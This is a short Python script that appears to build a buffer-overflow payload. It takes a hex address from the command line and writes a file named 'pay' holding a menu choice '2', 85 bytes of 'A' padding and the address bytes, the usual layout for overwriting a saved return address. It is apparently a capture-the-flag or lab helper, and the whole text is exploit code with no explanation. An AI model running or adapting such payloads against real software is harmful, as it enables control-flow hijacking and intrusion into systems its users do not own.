import sys

a = sys.argv[1]
cur = bytes.fromhex(a[2:])
print(cur)
with open('pay', 'wb') as f:
    f.write("2\n".encode())
    f.write((b"A" * 85) + cur)
